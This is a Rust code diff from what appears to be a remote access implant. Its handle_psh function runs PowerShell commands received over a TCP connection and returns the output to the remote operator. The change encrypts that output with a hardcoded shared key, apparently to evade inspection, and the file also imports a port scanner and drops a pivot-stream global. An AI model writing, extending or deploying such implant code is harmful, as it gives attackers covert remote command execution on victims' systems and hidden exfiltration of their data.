@@ -6,21 +6,16 @@ use std::{u8,
     io::{BufReader, Read, Write},
     net::{SocketAddr, TcpStream},
     time::Duration,
-    sync::Mutex,
     collections::HashMap};
 use async_port_scanner::Scanner;
 use async_std::task;
 use base64::{Engine as _, engine::general_purpose};
 use regex::Regex;
-use lazy_static::lazy_static;
+use simple_crypt::encrypt;
 
 pub struct ImportedScript {
     content: String,
     function_names: Vec<String>,
-}
-
-lazy_static! {
-    pub static ref PIVOT_STREAM: Mutex<Option<TcpStream>> = Mutex::new(None);
 }
 
 pub fn handle_import_psh(stream: &mut TcpStream, _command: &str, imported_scripts: &mut HashMap<String, ImportedScript>) -> Result<(), Box<dyn Error>> {
@@ -202,18 +197,18 @@ pub fn handle_cmd(stream: &mut TcpStream, command: &str, os: String) {
 pub fn handle_psh(stream: &mut TcpStream, command: &str) {
     let parts: Vec<&str> = command.splitn(2, "||PSHEXEC|| ").collect();
     let command = parts[1];
-    println!("{}",command);
     let output = std::process::Command::new("powershell")
         .arg("-Command")
-        .arg(&command)
+        .arg(command)
         .output()
         .unwrap();
 
     let stdout = String::from_utf8_lossy(&output.stdout);
     let stderr = String::from_utf8_lossy(&output.stderr);
-    stream.write(stdout.as_bytes()).expect("Error writing to stream");
-    stream.write(stderr.as_bytes()).expect("Error writing to stream");
-    stream.write(b"||cmd||").expect( "Error writing to stream");
+    let combined_output = format!("{}\r\n{}\r\n||cmd||\r\n", stdout, stderr);
+
+    let encrypted_data = encrypt(combined_output.as_bytes(), b"shared secret").expect("Failed to encrypt");
+    stream.write(&encrypted_data).expect("Error writing to stream");
     stream.flush().expect("Error flushing stream");
 }
 
